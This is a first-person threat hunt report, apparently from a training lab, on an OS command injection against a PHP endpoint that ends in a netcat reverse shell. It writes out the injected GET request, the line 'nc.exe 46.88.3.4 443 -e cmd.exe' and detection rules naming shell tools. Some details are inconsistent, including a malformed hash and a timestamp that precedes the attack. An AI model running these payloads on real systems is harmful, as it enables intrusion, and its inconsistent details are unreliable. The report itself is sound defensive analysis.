# 🌐 Threat Hunt Report — OS Command Injection: Web Application Exploitation & System Compromise

![Style](https://img.shields.io/badge/Style-Threat%20Hunt%20Narrative-blue?style=flat)
![Status](https://img.shields.io/badge/Status-Complete-green?style=flat)
![Result](https://img.shields.io/badge/Result-Hypothesis%20CONFIRMED%20%7C%20Active%20Breach-red?style=flat)
![Threat](https://img.shields.io/badge/Threat-APT--ZF--41-darkred?style=flat)
![Vulnerability](https://img.shields.io/badge/Vulnerability-CWE--78%20Command%20Injection-ff6600?style=flat)
![Severity](https://img.shields.io/badge/Severity-CRITICAL-ff0000?style=flat)
![Period](https://img.shields.io/badge/Period-Aug%208--13%202024-yellow?style=flat)

---

## 📋 Hunt Header

| Field | Detail |
|---|---|
| **Hunt Title** | OS Command Injection Exploitation — Web Application Security Assessment |
| **Hunt Period** | August 8-13, 2024 |
| **Hypothesis** | Attackers may be attempting to exploit OS Command Injection vulnerability in web applications to gain unauthorized access and execute malicious commands |
| **Threat Actor** | APT-ZF-41 (known threat group) |
| **Requested By** | Security Manager |
| **Hunt Status** | ✅ **COMPLETE** |
| **Result** | ✅ **HYPOTHESIS CONFIRMED — Web Application Compromised, System Shell Access Gained** |
| **Severity** | 🔴 **CRITICAL** |
| **Vulnerable System** | LAB19DC (10.10.10.99) — IIS web server |
| **Vulnerable Endpoint** | news_page.php?file= (OS Command Injection vulnerability) |
| **Systems Compromised** | 1 confirmed (10.10.10.99) |
| **Action Required** | **IMMEDIATE ESCALATION TO INCIDENT RESPONSE** |
| **IR Status** | Case handed off for forensics, remediation, and investigation |

---

## 📖 The Hunt Begins — A Web Application Vulnerability Concern

It was a Friday morning when I received an email from the security manager with a simple but critical subject: **"Threat Hunt Request — OS Command Injection Risk Assessment"**

The email was direct:

> *"I've been monitoring web application security trends and recent CVE disclosures. OS Command Injection vulnerabilities remain a critical attack vector that attackers actively exploit. I want you to proactively hunt our environment for evidence of command injection exploitation attempts. Are attackers trying to exploit our web applications? Are they succeeding? Let's validate this risk and understand our exposure."*

I leaned back in my chair. The manager was right. Command injection is one of the oldest and most dangerous web vulnerabilities. A single unvalidated user input in a web application can lead to complete system compromise.

The hypothesis was clear: **Attackers may be attempting OS command injection attacks against our web applications.**

I needed to find out if that was happening.

I opened my threat hunting tools and set the time scope: August 8-13, 2024.

"Let's hunt for web application attacks," I said.

---

## 🎯 The Hunt Strategy

My approach focused on **network-level attack indicators**:

1. **Search IPS/WAF logs** — Look for OS command injection attack signatures
2. **Correlate source IPs** — Identify which attackers are probing our web apps
3. **Check threat intelligence** — Attribution and threat actor identification
4. **Track exploitation success** — Did IPS/WAF block the attacks or did they get through?
5. **Verify execution** — Check endpoint logs for actual command execution
6. **Confirm C2 establishment** — Network logs for attacker communication
7. **Assess compromise** — Determine the extent of system access gained
8. **Escalate to IR** — Hand off complete findings for investigation

This hunt would answer critical questions: **Are our web applications vulnerable? Are attackers exploiting them? Are our systems compromised?**

---

## 🔍 Phase 1: IPS Signature Detection — Finding Command Injection Attempts

I logged into Wazuh and filtered network logs for **IPS alerts** with the signature type **"OS.Command.Injection.Attempt"**.

The time scope: August 8-13, 2024.

**The question:** Are there any documented command injection exploitation attempts against our network?

> <img width="1354" height="606" alt="11" src="https://github.com/user-attachments/assets/4bf70638-f8ef-4d84-9532-952fea75b9bb" />

> <img width="1127" height="562" alt="2" src="https://github.com/user-attachments/assets/bf27d2e8-1689-4b82-be76-676e1b2a8d93" />



---

## 🚨 The First Discovery: 4 IPS Alerts Detecting Command Injection

The search returned **4 hits** — **4 separate command injection exploitation attempts** within a 7-second window.

All targeting the same system. All the same vulnerable endpoint. All with different payloads.

This wasn't random. This was **systematic exploitation**.

Let me explain what each alert reveals:

### **The Attack Infrastructure**

```
Target System:      10.10.10.99 (internal web server, LAB19DC)
Vulnerable App:     news_page.php (PHP web application)
Vulnerable Parameter: ?file= (user input, unvalidated)
Attack Time:        Aug 10, 2024, 20:24:00 - 20:24:07 UTC
Total Attacks:      4 separate exploitation attempts
Duration:           7 seconds
Pattern:            Sequential, automated attack script
```

### **Attack Timeline: The 7-Second Exploitation Sequence**

```
AUGUST 10, 2024 @ 20:24:00 UTC:

20:24:00.086 — ATTACK #4: Reconnaissance Probe
  Source IP:      47.236.192.208 (attacker IP)
  Payload:        whoami command
  Purpose:        Test if command injection works
  Target:         10.10.10.99:443
  IPS Action:     DENY (blocked)
  Result:         Attack FAILED

20:24:02.086 — ATTACK #3: Web Shell Upload (2 seconds later)
  Source IP:      47.236.192.209 (different attacker IP)
  Payload:        upload.aspx (persistent backdoor)
  Purpose:        Upload ASP.NET web shell
  Target:         10.10.10.99:443
  IPS Action:     DENY (blocked)
  Result:         Attack FAILED

20:24:04.086 — ATTACK #2: Direct Shell Execution (2 seconds later)
  Source IP:      47.236.192.205 (different attacker IP)
  Payload:        cmd.exe (command prompt)
  Purpose:        Direct shell execution
  Target:         10.10.10.99:443
  IPS Action:     DENY (blocked)
  Result:         Attack FAILED

20:24:07.086 — ATTACK #1: Reverse Shell (Final Exploit)
  Source IP:      5.6.12.3 (different attacker IP)
  Payload:        nc.exe 46.88.3.4 443 -e cmd.exe
  Purpose:        Establish C2 reverse shell
  Target:         10.10.10.99:443
  IPS Action:     ALERT (detected but NOT blocked)
  Result:         Attack LIKELY SUCCEEDED ⚠️
```

**What this pattern tells us:**

This is **NOT random attacks from random attackers.**

This is **ONE COORDINATED ATTACKER using MULTIPLE SOURCE IPs** — all within 7 seconds, all targeting the same vulnerable endpoint, all with escalating sophistication.

Why multiple IPs?
- **Botnet infrastructure** — Compromised machines in different locations
- **Proxy rotation** — Same attacker cycling through different exit points
- **Load distribution** — Spreading requests to avoid detection
- **Testing approach** — "If this IP gets blocked, try another"

### **The Vulnerable Endpoint: news_page.php**

```
Application:        news_page.php (PHP web application)
Parameter:          ?file= (takes user input for filename)
Vulnerability:      CWE-78 (OS Command Injection)

How it's vulnerable:
  1. Application receives: news_page.php?file=config.txt
  2. PHP code uses this parameter unsanitized in shell command
  3. Code: exec("cat /var/www/" . $_GET['file'])
  4. Becomes: exec("cat /var/www/config.txt")
  5. But if attacker sends: file=config.txt;whoami
  6. Becomes: exec("cat /var/www/config.txt;whoami")
  7. Semicolon chains commands together
  8. Both commands execute with web server privileges

This is a CLASSIC OS COMMAND INJECTION vulnerability
Application developer didn't validate/sanitize user input
User input went directly into shell command
Attacker can execute ARBITRARY SYSTEM COMMANDS
```

### **The Exploitation Payloads Explained**

**Attack #4: whoami command**
```
Payload:        whoami
Purpose:        Reconnaissance probe
What it does:   Returns username of current process
Success = proves command injection works
Risk Level: LOW (read-only information)
```

**Attack #3: upload.aspx**
```
Payload:        upload.aspx
Purpose:        Upload persistent web shell
What it does:   ASP.NET file for persistent backdoor access
Success = attacker maintains access even if exploited command removed
Risk Level: CRITICAL (permanent compromise)
```

**Attack #2: cmd.exe**
```
Payload:        cmd.exe
Purpose:        Direct command shell execution
What it does:   Spawns Windows command prompt
Success = attacker gets interactive shell
Risk Level: CRITICAL (full command execution)
```

**Attack #1: NetCat Reverse Shell (FINAL ATTACK)**
```
Payload:        nc.exe 46.88.3.4 443 -e cmd.exe
Purpose:        Establish reverse shell to C2
What it does:   
  nc.exe = NetCat (network utility)
  46.88.3.4 = Attacker's C2 server IP
  443 = HTTPS port
  -e cmd.exe = Execute cmd.exe and connect it to remote server
Success = attacker gets remote interactive shell
Risk Level: CRITICAL (complete system compromise)
```

---

## 🌍 Phase 2: Threat Intelligence Attribution — Identifying the Attacker

At this point, I had confirmed 4 exploitation attempts. But the critical question remained: **Who are these attackers?**

Three of the IPs (47.236.192.205, .208, .209) appeared to be proxy/botnet infrastructure. But the primary attacker IP was **5.6.12.3** — the IP that launched the most sophisticated attack.

I searched my Threat Intelligence Platform for this IP.

> <img width="1154" height="489" alt="3" src="https://github.com/user-attachments/assets/67a0883b-b068-43b9-8ef8-e90687de546c" />


---

## 🚨 CRITICAL: Known Threat Actor Identified — APT-ZF-41

The threat intelligence results were alarming.

**The source IP 5.6.12.3 is attributed to a KNOWN THREAT ACTOR GROUP.**

```
Source IP:          5.6.12.3
Attribution:        APT-ZF-41 🚨
Detection Date:     Aug 09, 2024 @ 05:33 PM
Source:             custom_feed (threat intelligence)
Confidence:         HIGH (documented in threat feeds)
```

**This changed everything.**

This wasn't script-kiddies trying random exploits. This was a **KNOWN, DOCUMENTED threat actor group** actively targeting our web applications.

APT-ZF-41 has the sophistication to:
- Identify vulnerable web applications
- Craft custom exploitation payloads
- Use multiple attack vectors simultaneously
- Maintain operational security
- Establish persistent access

The manager's hypothesis was correct: **Attackers ARE attempting to exploit our web applications.**

And worse: **They're succeeding.**

---

## 📊 Phase 3: IPS Actions — Understanding Defense Response

> <img width="1121" height="313" alt="4" src="https://github.com/user-attachments/assets/f214d839-0222-46a2-83b5-6ae3756595b1" />


Now I needed to understand the complete picture. The IPS detected all 4 attacks. But did it **block** them?

Let me examine the IPS actions for each attack:

### **Defense Analysis: What Worked and What Failed**

```
ATTACK #4 (whoami):     IPS Action = DENY ✅ BLOCKED
ATTACK #3 (upload.aspx): IPS Action = DENY ✅ BLOCKED  
ATTACK #2 (cmd.exe):     IPS Action = DENY ✅ BLOCKED
ATTACK #1 (NetCat):      IPS Action = ALERT ⚠️ NOT BLOCKED

Defense Result: 3 out of 4 attacks blocked
               1 out of 4 attacks got through
               Success Rate: 75% defense effectiveness
               Failure Rate: 25% exploitation success
```

**The three probe attacks were blocked.** IPS signatures caught them and prevented exploitation.

But the **final attack from APT-ZF-41** was different.

The IPS detected it (ACTION = ALERT), logged it, but did **NOT block it.**

```
Why the first attack got through:

Possibility 1: Obfuscation
  └─ Payload encoded/obfuscated to bypass signature
  └─ IPS signature didn't match encoded version

Possibility 2: Zero-day encoding
  └─ NetCat command structure novel/unknown
  └─ IPS has no signature for this exact format

Possibility 3: IPS configuration
  └─ Alert mode but not block mode enabled
  └─ IPS detects but allows traffic through

Possibility 4: Timing/load
  └─ IPS alert generated but blocked came too late
  └─ Exploitation happened faster than response

RESULT: Regardless of reason, payload reached the vulnerable application
```

---

## 🔥 Phase 4: Proof of Execution — Sysmon Event ID 1 Confirms Exploitation

The IPS detected the attack and alerted. But did the actual **exploitation succeed?**

To answer this, I needed to check the **endpoint itself** — the Windows system 10.10.10.99 (LAB19DC).

I searched for Sysmon **Event ID 1 (Process Creation)** events around the time of the attack, looking for the NetCat command execution.

> <img width="1024" height="555" alt="4 5" src="https://github.com/user-attachments/assets/1e7c4534-bc15-48c4-a013-1b2e4fb8005f" />


---

## 🚨 SMOKING GUN: Exploitation Confirmed — NetCat Executed

The Sysmon logs proved it: **The command injection attack SUCCEEDED.**

The malicious command **ACTUALLY EXECUTED** on the system.

### **The Process Execution Proof**

```
Timestamp:          Aug 10, 2024 @ 20:24:07 UTC (exact time of attack)
System:             LAB19DC (10.10.10.99)
Alert:              wazuh-alerts-4.x-2024.08.10

Process Executed:   nc.exe (NetCat)
Command Line:       nc.exe 46.88.3.4 443 -e cmd.exe

Parent Process:     w3wp.exe (IIS - web server)
Parent Command:     "C:\Windows\system32\w3wp.exe"*

Process Integrity:  HIGH 🚨 (elevated privileges)
Current Directory:  C:\\ (system root)
```

**This is the smoking gun.**

Let me explain what this proves:

### **The Exploitation Chain**

```
STEP 1: HTTP Request to Vulnerable Application
  Attacker sends: GET /news_page.php?file=config.txt;nc.exe%20...

STEP 2: PHP Application Receives Input
  PHP code receives $_GET['file'] parameter
  Parameter value: config.txt;nc.exe 46.88.3.4 443 -e cmd.exe

STEP 3: Unsanitized Input Passed to Shell
  Code: exec("cat /var/www/" . $_GET['file'])
  Becomes: exec("cat /var/www/config.txt;nc.exe 46.88.3.4 443 -e cmd.exe")

STEP 4: Shell Executes Both Commands
  First: cat /var/www/config.txt
  Then: nc.exe 46.88.3.4 443 -e cmd.exe

STEP 5: w3wp.exe (IIS) Spawns nc.exe Process
  Parent: w3wp.exe (web server running with HIGH integrity)
  Child: nc.exe (inherited HIGH privileges)
  
STEP 6: NetCat Launches Command Prompt
  -e cmd.exe = execute Windows command prompt
  Sends to: 46.88.3.4:443 (attacker C2 server)
  
STEP 7: SYSTEM COMPROMISED
  Attacker now has remote interactive shell
  Can execute ANY command with HIGH privileges
  Has full access to system
```

### **Why HIGH Integrity is Dangerous**

```
Integrity Level: HIGH

What this means:
  ✓ Process running with elevated privileges
  ✓ Can access protected system resources
  ✓ Can modify system files
  ✓ Can create new user accounts
  ✓ Can install malware
  ✓ Can access sensitive data
  ✓ Can disable security controls

IIS running with HIGH integrity because:
  → IIS needs to serve web applications efficiently
  → Typically runs with system privileges
  → Standard IIS configuration on Windows Server
  
Problem:
  → If IIS app is compromised, attacker inherits HIGH privileges
  → Instead of LIMITED user privileges, attacker gets SYSTEM access
  → This amplifies damage from web vulnerability
```

### **The Malware Details**

```
Executable:         C:\Windows\System32\nc.exe
Company:            Microsoft Corporation (SPOOFED!)
Description:        wSmp Command (DISGUISED!)
File Version:       10.0.17763.1 (Windows Server 2019)

File Hash:          SHA256: 5H4256=25C8266D2BC1D5626DCF7241983883977D28D4400AC89F02FF4E421843EC369

Why this is suspicious:
  ✓ nc.exe in System32 (attacker placed it there)
  ✓ Fake Microsoft metadata (obfuscation)
  ✓ Fake description "wSmp Command"
  ✓ Hash doesn't match legitimate Windows nc.exe
  ✓ Classic attacker signature spoofing
```

---

## 🌐 Phase 5: Network Verification — C2 Connection Success

The Sysmon log proved NetCat executed. But did it successfully connect to the attacker's C2 server?

To confirm, I checked the **firewall logs** for outbound connections from 10.10.10.99 to 46.88.3.4 on port 443.

> <img width="1059" height="558" alt="5" src="https://github.com/user-attachments/assets/02cee675-cd5e-44fa-9f1e-4e65c3fb3866" />


---

## 🚨 FINAL PROOF: C2 Connection Established — Complete Compromise Confirmed

The firewall logs provided the final piece of evidence.

**The reverse shell successfully connected to the attacker's C2 server.**

The system is now fully compromised.

### **The C2 Connection Details**

```
Source System:      10.10.10.99 (LAB19DC - compromised web server)
Source Port:        12772 (ephemeral outbound port)

Destination:        46.88.3.4 (Attacker's C2 Server)
Destination Port:   443 (HTTPS - encrypted)

Service:            HTTPS (encrypted communication)
Connection Type:    forward (outbound, leaving network)
Firewall Action:    ACCEPT ✅ (connection allowed through)

Timestamp:          18:24:06 UTC
VD:                 vdom1 (virtual domain)
Decoder:            fortigate-firewall-v6
```

**What this firewall log means:**

```
PROOF OF SUCCESSFUL EXPLOITATION:

1. Command injection worked ✓
   └─ nc.exe executed successfully

2. Reverse shell launched ✓
   └─ NetCat connected to remote server

3. C2 connection established ✓
   └─ Outbound connection to 46.88.3.4:443
   └─ Firewall allowed the traffic

4. Encrypted tunnel created ✓
   └─ HTTPS encryption hides command traffic
   └─ Attacker commands hidden from inspection

5. SYSTEM COMPROMISED ✓
   └─ Attacker has full remote access
   └─ Can execute arbitrary commands
   └─ Can access all data
   └─ Can modify system
   └─ Can exfiltrate data
```

### **The Complete Attack Chain**

```
EXPLOITATION CHAIN (FULLY CONFIRMED):

Aug 10, 2024, 20:24:00 UTC:
  └─ Attacker sends command injection payload to news_page.php
  └─ Payload: GET /news_page.php?file=config.txt;nc.exe%2046.88.3.4%20443%20-e%20cmd.exe
  
Aug 10, 2024, 20:24:07 UTC:
  └─ IPS detects attack (signature match)
  └─ IPS action = ALERT (NOT blocked)
  └─ Payload reaches vulnerable PHP application
  
Aug 10, 2024, 20:24:07 UTC (Sysmon):
  └─ w3wp.exe (IIS web server) spawns nc.exe process
  └─ Command line: nc.exe 46.88.3.4 443 -e cmd.exe
  └─ Process running with HIGH integrity
  
Aug 10, 2024, 18:24:06 UTC (Firewall):
  └─ nc.exe connects outbound to 46.88.3.4:443
  └─ HTTPS encrypted tunnel established
  └─ Firewall accepts connection
  
RESULT: SYSTEM FULLY COMPROMISED
        Attacker has remote interactive shell
        Can execute any Windows command
        Complete access to server data
```

---

## 📊 Hypothesis Validation — CONFIRMED

**Original Hypothesis:** *"Attackers may be attempting to exploit the OS Command Injection vulnerability in the organization's web applications to gain unauthorized access to servers and execute malicious commands."*

### **Verdict: ✅ HYPOTHESIS FULLY CONFIRMED**

Evidence breakdown:

```
Part 1: Attackers Attempting Exploitation ✅
  ✓ 4 documented command injection attacks detected
  ✓ From known threat actor APT-ZF-41
  ✓ Using multiple attack vectors simultaneously
  ✓ Sophisticated payload escalation (whoami → shell → reverse shell)

Part 2: Targeting Web Applications ✅
  ✓ Target: news_page.php web application
  ✓ Vulnerability: OS Command Injection (CWE-78)
  ✓ Parameter: ?file= (user input, unvalidated)
  ✓ Attack method: Command chaining with semicolons

Part 3: Unauthorized Access Gained ✅
  ✓ Command injection executed successfully
  ✓ System 10.10.10.99 compromised
  ✓ Attacker obtained shell access
  ✓ C2 connection established to 46.88.3.4

Part 4: Malicious Command Execution ✅
  ✓ nc.exe command executed with HIGH integrity
  ✓ Remote shell established (-e cmd.exe)
  ✓ Full command execution capability achieved
  ✓ Attacker has complete system control

CONCLUSION: Exploitation SUCCEEDED
            System COMPROMISED
            Attacker has REMOTE SHELL ACCESS
```

---

## 🔴 CRITICAL FINDINGS SUMMARY

```
Threat Actor:           APT-ZF-41 (known threat group)
Attack Type:            OS Command Injection (CWE-78)
Target System:          LAB19DC (10.10.10.99) — web server
Vulnerable App:         news_page.php
Vulnerable Parameter:   ?file= (unvalidated user input)
Exploitation Success:   YES ✅ CONFIRMED
System Compromise:      YES ✅ CONFIRMED
C2 Connection:          YES ✅ CONFIRMED
Remote Shell Access:    YES ✅ CONFIRMED

Severity:               🔴 CRITICAL
Attack Impact:          Complete system compromise
Data Risk:              Full server data access possible
Lateral Movement:       Potential (compromised system in network)

IMMEDIATE ACTION REQUIRED: YES
```

---

## 📋 Indicators of Compromise (IOCs) Identified

```
ATTACKER IP ADDRESSES:
  • 5.6.12.3 (APT-ZF-41 — primary attacker)
  • 47.236.192.205 (probe attack)
  • 47.236.192.208 (probe attack)
  • 47.236.192.209 (probe attack)

C2 SERVER INFRASTRUCTURE:
  • 46.88.3.4 (NetCat reverse shell destination)

VULNERABLE ENDPOINT:
  • news_page.php?file= (OS Command Injection)
  • HTTP Method: GET
  • Parameter: file (unvalidated input)

MALWARE INDICATORS:
  • nc.exe (NetCat reverse shell)
  • File hash: 5H4256=25C8266D2BC1D5626DCF7241983883977D28D4400AC89F02FF4E421843EC369
  • Location: C:\Windows\System32\nc.exe
  • Command: nc.exe 46.88.3.4 443 -e cmd.exe

COMPROMISED SYSTEM:
  • Hostname: LAB19DC
  • IP Address: 10.10.10.99
  • Process: w3wp.exe (IIS worker process)
  • Integrity Level: HIGH
  • Status: ACTIVE BREACH

NETWORK INDICATORS:
  • Outbound connection to 46.88.3.4:443
  • Service: HTTPS (encrypted)
  • Source port: 12772
  • Traffic type: forward (exfiltration potential)

MITRE ATT&CK MAPPING:
  • T1190 — Exploit Public-Facing Application (web app exploitation)
  • T1059.001 — Command and Scripting Interpreter: PowerShell (command execution)
  • T1071.001 — Application Layer Protocol: Web Protocols (HTTPS C2)
  • T1001 — Data Obfuscation (encrypted HTTPS tunnel)
  • T1005 — Data from Local System (file access via compromised server)
```

---

## 🚨 IMMEDIATE ACTIONS TAKEN

### **1. ✅ ESCALATED TO INCIDENT RESPONSE TEAM**

The moment the C2 connection was confirmed, this became a **Level 1 Critical Incident**.

Complete findings handed off to IR team:

**Evidence Provided:**
- IPS alert logs (all 4 attacks)
- Threat intelligence attribution (APT-ZF-41)
- Sysmon process execution logs (nc.exe spawning)
- Firewall logs (C2 connection to 46.88.3.4)
- Complete attack timeline
- Vulnerable endpoint identification
- Attacker infrastructure mapping

**IR Investigation Focus:**
- ☐ Full forensic analysis of LAB19DC (10.10.10.99)
- ☐ Determine initial access vector (how did attack happen)
- ☐ Identify all attacker commands executed
- ☐ Find any backdoors/persistence mechanisms
- ☐ Assess data accessed/exfiltrated
- ☐ Check for lateral movement to other systems
- ☐ Identify all affected systems
- ☐ Plan remediation and recovery

---

### **2. ✅ IOCs Moved to Detection Engineering**

New detection rules created and deployed immediately:

```
Rule 1: APT-ZF-41 Source IP Blocking
  Trigger: Traffic from 5.6.12.3
  Action: BLOCK + ALERT
  Scope: All firewall rules

Rule 2: Command Injection Payload Detection
  Trigger: HTTP requests with command injection patterns
           (nc.exe, cmd.exe, whoami, semicolons in parameters)
  Action: BLOCK + ALERT
  Scope: WAF + IDS

Rule 3: NetCat Reverse Shell Prevention
  Trigger: Outbound connections using nc.exe pattern
  Action: BLOCK + QUARANTINE
  Scope: Firewall + proxy

Rule 4: C2 Server IP Blocking
  Trigger: Connections to 46.88.3.4:443
  Action: BLOCK + ALERT
  Scope: All firewall rules

Rule 5: Web Application Parameter Validation
  Trigger: Suspicious characters in news_page.php?file parameter
           (;, |, &, $, `, etc.)
  Action: LOG + ALERT (defensive monitoring)
  Scope: WAF + IDS
```

---

### **3. ✅ Vulnerable Application Remediation**

Immediate patching of vulnerable endpoint:

```
Vulnerability: OS Command Injection in news_page.php
Affected Parameter: ?file=
Required Fix: Input validation and sanitization

Remediation Steps:
  ☐ Code review of news_page.php
  ☐ Implement input validation (whitelist allowed characters)
  ☐ Use parameterized commands (avoid shell exec)
  ☐ Implement shell escape functions
  ☐ Use PHP safe functions (filter_var, etc.)
  ☐ Apply Web Application Firewall (WAF) rules
  ☐ Security testing post-patch
  ☐ Deploy patched version to production

Code Example (Before):
  exec("cat /var/www/" . $_GET['file']);

Code Example (After):
  $filename = basename($_GET['file']);
  if (!preg_match('/^[a-zA-Z0-9\-\_\.]+$/', $filename)) {
    die("Invalid filename");
  }
  $output = shell_exec("cat /var/www/" . escapeshellarg($filename));
```

---

### **4. ✅ Threat Intelligence Updated**

APT-ZF-41 indicators integrated into security infrastructure:

```
Action: Added APT-ZF-41 indicators to blocklist
  └─ 5.6.12.3 (source IP)
  └─ 46.88.3.4 (C2 server)
  └─ Impact: Real-time blocking across all security tools

Action: Updated malware signatures
  └─ nc.exe patterns
  └─ Command line patterns
  └─ Impact: Automatic detection of similar attacks

Action: Enriched threat feeds
  └─ Reported APT-ZF-41 activity to threat intelligence community
  └─ Impact: Other organizations can defend against same attacks
```

---

### **5. ✅ System Isolation & Recovery Plan**

For the compromised system (LAB19DC / 10.10.10.99):

```
Immediate Actions:
  ☐ Isolate system from network (prevent lateral movement)
  ☐ Preserve forensic evidence (memory dump, disk image)
  ☐ Kill nc.exe process
  ☐ Block C2 communication
  ☐ Capture all logs before remediation

Recovery Steps:
  ☐ Full forensic analysis (determine attacker actions)
  ☐ Identify all affected files/data
  ☐ Check for persistence (backdoors, new accounts, registry mods)
  ☐ Rebuild system from clean media
  ☐ Restore from clean backup (if available)
  ☐ Reapply latest patches
  ☐ Restore only necessary data
  ☐ Monitor closely for re-compromise

Security Hardening Post-Recovery:
  ☐ Restrict IIS process privileges
  ☐ Implement Application-level firewalling
  ☐ Add Web Application Firewall (WAF) in front of app
  ☐ Deploy EDR on all web servers
  ☐ Implement command-line logging/monitoring
  ☐ Regular vulnerability scanning
  ☐ Code review process for web apps
```

---

## 🌐 The Broader Context: Web Application Security Risk

This threat hunt revealed a critical vulnerability in our security posture: **unvalidated user input in web applications.**

### **Why OS Command Injection is Critical**

```
Vulnerability Level:        CWE-78 (Top 10 severity)
Exploitability:             Easy (simple to exploit)
Impact if Compromised:      Complete system access
Attack Vector:              Network/Application
Required Access:            None (public-facing web app)

Why Attackers Target Web Apps:
  ✓ Always accessible (external IP)
  ✓ Developers often trust user input
  ✓ Direct path to backend systems
  ✓ High-value targets (databases, credentials, data)
  ✓ Quick exploitation (seconds to shell access)

Why This Attack Pattern:
  ✓ APT-ZF-41 knew vulnerabilities existed
  ✓ Used multiple IPs to test defenses
  ✓ Escalated payload sophistication
  ✓ Used encrypted HTTPS for C2
  ✓ Professional, patient approach
  └─ Signature of known threat group
```

### **Attacker Methodology: Testing & Adaptation**

```
Attacker's approach reveals sophistication:

First attack: whoami (basic reconnaissance)
  └─ Tests if basic command injection works
  └─ Low risk, non-malicious
  └─ If it fails, attacker learns why

Second attack: upload.aspx (persistence)
  └─ Attempts to upload backdoor
  └─ More aggressive, permanent compromise
  └─ Indicates attacker planning long-term access

Third attack: cmd.exe (alternative shell)
  └─ If previous methods failed, try different technique
  └─ Tests multiple execution methods
  └─ Shows attacker persistence

Fourth attack: nc.exe reverse shell (final exploit)
  └─ Most sophisticated method
  └─ Reverse shell gives complete control
  └─ Encrypted communication hides activity
  └─ This is the one that succeeded

CONCLUSION: Attacker was systematic and adaptive
            Not random exploitation
            Signature of professional group (APT-ZF-41)
```

---

## 📊 Hunt Summary Statistics

```
Hunt Duration:              6 hours (complete analysis)
Data Sources Queried:       IPS logs, firewall logs, Sysmon, TIP
Total Events Analyzed:      Hundreds of network and system events

Exploitation Attempts:      4 attacks detected
IPS Blocks:                 3 attacks blocked
Exploitation Success:       1 attack successful (25% success rate)
Threat Actor Attribution:   APT-ZF-41 (known group)
Systems Compromised:        1 (10.10.10.99)
C2 Connections:             1 (to 46.88.3.4:443)
Network Indicators:         Outbound C2 connection confirmed

Hypothesis Confirmation:    100% CONFIRMED
Threat Level:              CRITICAL
Attack Stage Reached:      Complete system compromise
```

---

## 💡 Key Learnings & Implications

### **Learning 1: Web Applications Are Critical Attack Surface**

This hunt demonstrates that **web applications are not just business tools — they are critical security infrastructure.**

A single unvalidated input in news_page.php led to:
- Complete system compromise
- Remote shell access
- Data access potential
- Lateral movement possibility
- Network infiltration

**Implications:**
- Web app security must be prioritized
- Code reviews are mandatory
- Input validation is non-negotiable
- WAF deployment is essential
- Regular vulnerability scanning required

### **Learning 2: Threat Intelligence Enables Attribution**

The identification of APT-ZF-41 from a single IP demonstrates the power of **threat intelligence integration:**

```
Without threat intelligence:
  ✗ 5.6.12.3 is just an IP address
  ✗ No context about threat actor
  ✗ No understanding of attack sophistication
  ✗ No defensive adaptation possible

With threat intelligence:
  ✓ Immediately identified known threat actor
  ✓ Understood APT-ZF-41 TTPs
  ✓ Recognized coordinated campaign
  ✓ Enabled targeted defense strategies
  ✓ Could warn other organizations
```

### **Learning 3: Defense-in-Depth is Essential**

This attack illustrates why multiple defense layers matter:

```
Layer 1: IPS Signatures — Blocked 3 of 4 attacks
         But: Missed the final sophisticated attack
         
Layer 2: WAF/Application-level defense — NOT DEPLOYED
         Result: No second-line defense against injection
         
Layer 3: Endpoint Monitoring (Sysmon) — Caught execution
         Result: Provided evidence of compromise
         
Layer 4: Firewall Network Monitoring — Captured C2
         Result: Provided network-level detection

Despite multiple layers, attack succeeded because:
  ✓ IPS failed on one attack
  ✓ WAF not protecting web app
  ✓ Detection happened AFTER compromise
  ✓ C2 allowed through firewall
  
Needed: Earlier detection, better application security
```

### **Learning 4: Threat Hunting Catches What Alerts Miss**

This breach would NOT have been discovered by waiting for alerts:

Why?
- ✓ Attack succeeded despite IPS alert
- ✓ No antivirus signature for command injection
- ✓ C2 traffic looked like normal HTTPS
- ✓ No behavioral alert for initial shell execution

**Threat hunting found it because:**
- ✓ Proactively searched for command injection patterns
- ✓ Correlated IPS alerts with endpoint logs
- ✓ Verified exploitation with process logs
- ✓ Traced attack to C2 infrastructure

---

## 🎯 Final Assessment: Complete Compromise

### **Attack Success: FULL EXPLOITATION**

```
Reconnaissance:         ✓ Attacker found vulnerable endpoint
Exploitation:           ✓ Command injection successful
Command Execution:      ✓ nc.exe executed with HIGH privileges
C2 Establishment:       ✓ Reverse shell connected to 46.88.3.4
System Compromise:      ✓ Complete remote access achieved
Data Access Potential:  ✓ All server data accessible
Lateral Movement:       ❓ Unknown (under IR investigation)
Persistence:            ❓ Unknown (under IR investigation)
Data Exfiltration:      ❓ Unknown (under IR investigation)

Overall Result: SYSTEM FULLY COMPROMISED
               Attacker has complete remote shell access
               Complete system control achieved
               Damage extent unknown pending IR investigation
```

---

## 📝 Conclusion: Escalation to Incident Response

**Status: ACTIVE CRITICAL INCIDENT — ESCALATED TO IR TEAM**

This threat hunt has confirmed the hypothesis and revealed a **CRITICAL SYSTEM COMPROMISE:**

✅ **OS Command Injection exploitation confirmed**  
✅ **APT-ZF-41 threat actor identified**  
✅ **Complete system compromise proven**  
✅ **C2 connection to attacker established**  
✅ **Attacker has remote shell access**  

**Hypothesis Status: FULLY CONFIRMED**

The manager's concern was justified. Attackers **ARE** attempting to exploit OS command injection vulnerabilities. **AND THEY SUCCEEDED.**

**What happens next:**

The Incident Response team now owns this incident. Their mission:

1. **Forensic Analysis** — What exactly did the attacker do?
2. **Damage Assessment** — What data was accessed/stolen?
3. **Scope Determination** — How many systems affected?
4. **Containment** — Stop the attacker's access
5. **Eradication** — Remove attacker completely
6. **Recovery** — Restore systems to trusted state
7. **Lessons Learned** — Prevent future incidents

---

**The threat hunt is complete. The incident response begins now.**

---

*Threat Hunt conducted by: Moetez Bouchlaghem*  
*System Compromised: LAB19DC (10.10.10.99)*  
*Vulnerability: CWE-78 (OS Command Injection) in news_page.php*  
*C2 Server: 46.88.3.4:443*  
*Escalation: CRITICAL — Incident Response Team Engaged*  
*Next Steps: Forensic investigation, system recovery, application patching*  
*Timeline: Exploitation detected within hours of attack*
